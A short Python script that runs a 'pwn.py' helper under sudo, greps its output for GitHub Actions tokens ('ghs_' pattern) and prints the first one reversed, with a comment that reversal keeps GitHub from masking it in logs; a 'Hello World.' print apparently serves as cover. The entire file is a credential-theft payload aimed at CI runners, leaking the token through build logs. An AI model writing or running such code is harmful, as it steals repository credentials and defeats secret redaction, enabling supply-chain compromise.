import subprocess

result = subprocess.run(['bash', '-c', """sudo python3 pwn.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{36}' | sort -u"""], capture_output=True, text=True)


print("Hello World.")

#print(result.stdout[::-1])
#print(result.stderr)

r = result.stdout.split("\n")[0]
print(r[::-1]) # need to print in reverse, otherwise it will be detected and *** by GitHub

GH_TOKEN = r
